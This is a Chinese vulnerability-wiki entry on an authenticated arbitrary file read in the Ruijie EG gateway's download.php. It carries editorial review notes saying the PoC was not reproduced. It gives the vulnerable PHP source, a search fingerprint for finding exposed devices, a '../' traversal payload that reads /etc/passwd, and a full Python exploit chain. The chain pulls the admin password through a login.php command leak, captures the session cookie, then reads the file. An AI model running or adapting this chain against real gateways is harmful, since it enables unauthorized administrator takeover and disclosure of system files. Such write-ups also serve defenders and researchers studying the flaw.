---
version: "锐捷EG易网关"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-eed88a8539a486321f5437cc"
entity_id: "ve-eed88a8539a486321f5437cc"
schema_version: "1"
title: "锐捷 EG易网关 download.php 任意文件读取漏洞"
product: "Ruijie EG易网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "后台会话或login泄露前置；文件需存在且进程可读"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7-EG%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
---

# 锐捷 EG易网关 download.php 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EG易网关
- 本文讨论：download.php read_txtAction任意文件读取
- 版本、权限与配置前提：后台会话或login泄露前置；文件需存在且进程可读
- 资料类型：源码/链式PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- read_txt确实绕过indexAction的allow列表，应保留该动作区分，不能泛指所有download路径均无校验
- 脚本版本banner误写cli.php RCE
- 正文GET与脚本POST方法不同；helper v()是否支持二者需核；登录检测继承同样脆弱正则

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 固件版本/修复和父控制器鉴权待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件

## 漏洞影响

```
锐捷EG易网关
```

## 网络测绘

```
app="Ruijie-EG易网关"
```

## 漏洞复现

首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)

漏洞文件 download.php

```php
<?php
/**
 * 文件下载
 */
define('IN', true);     //定位该文件是入口文件
define('DS', DIRECTORY_SEPARATOR);
define('AROOT', dirname(__FILE__) . DS);
include_once(AROOT . 'mvc' . DS . 'controller' . DS . 'core.controller.php');

class defaultController extends coreController {

    /**
     * 应许下载的文件列表，不在该列表的文件一律不能下载，列表使用正则表达式
     * @var array
     */
    private $allow = array(
        "/^\/data\/.*$/",
        "/^\/mnt\/sata0\/webmail\/.*$/",
        "/^\/mnt\/sata0\/tech.+\.tar\.gz$$/",
        "/^\/mnt\/sata0\/mail\/.*$/",
        "/^\/mnt\/sata0\/audit_export\/.*$/",
        "/^\/tmp\/sslvpn\/export\/.*$/",
        "/^\/mnt\/sata0\/web\/nginx\/html\/sslvpn_pi\/.*$/",
        "/^\/tmp\/.ca_web\/.*$/",
        "/^\/mnt\/sata0\/sslvpn\/.*$/",
        "/^\/tmp\/html\/utlog.*$/",
    );
    private $error;     //错误描述

    function __construct() {
        // 载入默认的
        parent::__construct();
    }

    /**
     * 文件下载处理
     */
    public function indexAction() {
        $filepath = v("file");

        $fileinfo = pathinfo($filepath);
        $filename = iconv("UTF-8", "GB2312", $fileinfo["filename"] . (isset($fileinfo["extension"]) ? "." . $fileinfo["extension"] : ""));
        //只能读取下载GB2312文件不然会有乱码
        $filepointer = $this->_checkfile(iconv("UTF-8", "GB2312",$filepath));
        if ($filepointer !== false) {
            if (headers_sent()) {
                $this->error = "无法下载文件，已经输出其他请求头！";
            } else {
                header("Pragma: public");
                header("Expires: 0");
                header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                header("Cache-Control: private", false);
                header("Content-Type: {$this->_getMimeType($filename)}");
                header("Content-Disposition: attachment; filename=\"{$filename}\";");
                header("Content-Transfer-Encoding: binary");
                header("Content-Length: {$this->_getFileSize($filepointer)}");

                @ob_clean();

                rewind($filepointer);
                fpassthru($filepointer);
                exit();
            }
        }
        if ($this->error) {   //有错误产生
            ?>
            <!DOCTYPE html>
            <html>
                <head>
                    <title>文件下载失败</title>
                    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                    <script type="text/javascript">
                        alert("<?php echo $this->error; ?>");
                    </script>
                </script>
            </head>
            <body></body>
            </html>
            <?php
        }
    }

    /**
     * 读取文本文件内容，支持ajax请求
     */
    public function read_txtAction() {
        $filename = v("file");
        if (!file_exists($filename)) {
            $data["status"] = 2;
            $data["msg"] = $filename . "不存在";
            json_echo($data);
            exit();
        } else {
            $fileContent = file_get_contents($filename);
            $data = array("status" => true, "data" => $fileContent);
            json_echo($data);
        }
    }

    /**
     * 文件检查
     */
    private function _checkfile($filename) {
        if ($filename == false) {
            $this->error = "请指定要下载的文件！";
            return FALSE;
        }
        $isallow = false;
        foreach ($this->allow as $pattern) {
            if (preg_match($pattern, $filename)) {
                $isallow = true;
                break;
            }
        }
        if (!$isallow) {
            $this->error = "该文件不允许下载！";
            return FALSE;
        }
        if (!is_file($filename)) {
            $this->error = "该文件不存在！";
            return FALSE;
        } else if (!is_readable($filename)) {
            //if (system("chmod +r " . escapeshellarg($filename))) {
                $this->error = "无法下载该文件，没有权限！";
                return FALSE;
            //}
        }
        return fopen($filename, "rb");
    }

    /**
     * 获取文件mime类型
     * @param string $fileName 文件名
     * @return string
     */
    private function _getMimeType($fileName) {
        $charset = v("charset");
        switch (pathinfo($fileName, PATHINFO_EXTENSION)) {
            case "pdf": return "application/pdf";
            case "exe": return "application/octet-stream";
            case "zip": return "application/zip";
            case "doc": return "application/msword";
            case "xls": return "application/vnd.ms-excel";
            case "ppt": return "application/vnd.ms-powerpoint";
            case "gif": return "image/gif";
            case "png": return "image/png";
            case "jpeg":
            case "jpg": return "image/jpg";
            case "htm": return "text/html;charset=gbk";
            case "html": if(!$charset) {
                            return "text/html;charset=gbk";
                        }else {
                            return "text/html;charset=UTF-8";
                        }
            default: return "application/force-download";
        }
    }

    /**
     * 获取文件大小
     * @return int
     */
    private function _getFileSize($filePointer) {
        $stat = fstat($filePointer);
        return $stat['size'];
    }

}

include_once AROOT.'init.php';    //mvc初始化入口，放在底部
```

关键代码为

```php
/**
     * 读取文本文件内容，支持ajax请求
     */
    public function read_txtAction() {
        $filename = v("file");
        if (!file_exists($filename)) {
            $data["status"] = 2;
            $data["msg"] = $filename . "不存在";
            json_echo($data);
            exit();
        } else {
            $fileContent = file_get_contents($filename);
            $data = array("status" => true, "data" => $fileContent);
            json_echo($data);
        }
    }
```

直接从Get请求中提取 file参数读取文件，可以使用 **../** 跳转目录

验证POC

```plain
/download.php?a=read_txt&file=../../../../etc/passwd
```

![](./.resource/锐捷-EG易网关-download.php-任意文件读取漏洞/media/202202110928854.png)


## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 锐捷EG网关 cli.php RCE                                      \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
        if "data" in response.text and response.status_code == 200:
            password = re.findall(r'admin (.*?)"', response.text)[0]
            print("\033[36m[o] 成功获取, 账号密码为:  admin   {} \033[0m".format(password))
            POC_2(target_url, password)
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_2(target_url, password):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password={}'.format(password)
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在登录..... \033[0m".format(target_url))
        if "status" in response.text and "1" in response.text and response.status_code == 200:
            ruijie_cookie = "RUIJIEID=" + re.findall(r"'Set-Cookie': 'RUIJIEID=(.*?);", str(response.headers))[0] + ";user=admin;"
            print("\033[36m[o] 成功获取管理员Cookie: {} \033[0m".format(ruijie_cookie))
            POC_3(target_url, ruijie_cookie)

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_3(target_url, ruijie_cookie):
    vuln_url = target_url + "/download.php?a=read_txt&file=../../../../etc/passwd"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "{}".format(ruijie_cookie)
    }
    try:
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在读取 /etc/passwd..... \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

![](./.resource/锐捷-EG易网关-download.php-任意文件读取漏洞/media/202202110929078.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
